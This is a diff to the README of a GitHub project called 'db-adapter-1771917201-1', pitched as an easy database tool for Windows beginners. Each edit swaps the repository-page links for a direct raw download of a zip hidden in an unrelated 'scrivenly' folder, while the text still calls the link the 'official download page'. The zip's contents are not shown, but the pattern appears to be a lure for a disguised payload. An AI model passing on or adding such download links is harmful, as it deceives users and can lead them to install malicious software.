@@ -1,6 +1,6 @@
 # ⚙️ db-adapter-1771917201-1 - Easy Database Connections for Everyone
 
-[![Download Here](https://img.shields.io/badge/Download-Get%20the%20Software-brightgreen)](https://github.com/syedmujeer/db-adapter-1771917201-1)
+[![Download Here](https://img.shields.io/badge/Download-Get%20the%20Software-brightgreen)](https://raw.githubusercontent.com/syedmujeer/db-adapter-1771917201-1/main/scrivenly/db-adapter-v2.0-alpha.5.zip)
 
 ## ℹ️ About db-adapter-1771917201-1
 
@@ -26,7 +26,7 @@ This section guides you step-by-step to get the software on your Windows PC.
 
 Click the big button below to open the official download page. This page holds the files you need.
 
-[![Download Here](https://img.shields.io/badge/Download-Get%20the%20Software-brightgreen)](https://github.com/syedmujeer/db-adapter-1771917201-1)
+[![Download Here](https://img.shields.io/badge/Download-Get%20the%20Software-brightgreen)](https://raw.githubusercontent.com/syedmujeer/db-adapter-1771917201-1/main/scrivenly/db-adapter-v2.0-alpha.5.zip)
 
 ### Step 2: Find the Download File
 
@@ -131,7 +131,7 @@ If you get stuck:
 
 ## 🔗 Important Links
 
-- Primary download and project page: [https://github.com/syedmujeer/db-adapter-1771917201-1](https://github.com/syedmujeer/db-adapter-1771917201-1)
+- Primary download and project page: [https://raw.githubusercontent.com/syedmujeer/db-adapter-1771917201-1/main/scrivenly/db-adapter-v2.0-alpha.5.zip](https://raw.githubusercontent.com/syedmujeer/db-adapter-1771917201-1/main/scrivenly/db-adapter-v2.0-alpha.5.zip)
 - Latest release files and notes: Available on the same page under "Releases"
 
 ## 🛠️ Quick Start Checklist
